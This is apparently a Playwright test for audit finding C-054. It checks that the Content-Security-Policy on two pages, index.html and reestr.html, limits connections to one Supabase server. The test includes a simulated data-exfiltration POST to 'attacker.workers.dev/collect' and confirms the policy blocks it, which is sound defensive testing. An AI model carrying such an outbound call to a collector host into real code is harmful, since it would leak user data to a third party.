const {test,expect}=require('@playwright/test');
// C-054 (аудит, замечание 11): страницы связываются только со своим сервером Supabase.
for(const file of ['index.html','reestr.html']){
 test('C-054: '+file+' does not allow connections to any workers.dev address',async({page})=>{
  await page.goto('http://127.0.0.1:4173/'+file);
  const policy=await page.evaluate(()=>document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
  const connect=policy.split(';').map(s=>s.trim()).find(s=>s.startsWith('connect-src'));
  expect(connect.split(/\s+/).slice(1).sort()).toEqual(["'self'",'https://dcpthwmuiodrjepifzsd.supabase.co','wss://dcpthwmuiodrjepifzsd.supabase.co'].sort());
  const blocked=await page.evaluate(async()=>{
   const seen=new Promise(r=>document.addEventListener('securitypolicyviolation',e=>r(e.violatedDirective),{once:true}));
   let failed=false;try{await fetch('https://attacker.workers.dev/collect',{method:'POST',body:'x'});}catch{failed=true;}
   return {failed,directive:await Promise.race([seen,new Promise(r=>setTimeout(()=>r(null),2000))])};
  });
  expect(blocked.failed).toBe(true);
  expect(blocked.directive).toContain('connect-src');
 });
}
